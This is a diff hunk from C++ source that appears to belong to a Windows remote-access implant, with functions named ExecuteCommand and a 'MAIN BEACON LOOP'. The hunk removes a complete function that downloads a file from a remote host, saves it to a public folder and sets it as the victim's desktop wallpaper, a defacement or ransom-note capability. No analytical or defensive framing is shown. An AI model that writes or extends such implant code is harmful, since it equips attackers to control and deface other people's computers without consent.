@@ -694,27 +694,6 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
 }
 
 // =====================================================================
-//  SET WALLPAPER FROM DOWNLOADED BYTES
-// =====================================================================
-static void SetWallpaperFromUrl(const wchar_t* host, const wchar_t* urlPath) {
-    HttpResponse resp = WinHttpRequest(host, 443, L"GET", urlPath, "", L"");
-    if (resp.status != 200 || resp.body.empty()) {
-        DebugLog(L"Wallpaper download failed: HTTP " + std::to_wstring(resp.status));
-        return;
-    }
-    std::wstring wpPath = L"C:\\Users\\Public\\bg.jpg";
-    HANDLE hf = CreateFileW(wpPath.c_str(), GENERIC_WRITE, 0, nullptr,
-                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (hf == INVALID_HANDLE_VALUE) { DebugLog(L"Wallpaper: can't write file"); return; }
-    DWORD w = 0;
-    WriteFile(hf, resp.body.data(), (DWORD)resp.body.size(), &w, nullptr);
-    CloseHandle(hf);
-    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wpPath.c_str(),
-                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-    DebugLog(L"Wallpaper set: " + wpPath);
-}
-
-// =====================================================================
 //  MAIN BEACON LOOP
 // =====================================================================
 DWORD BeaconLoop(const Session& session) {
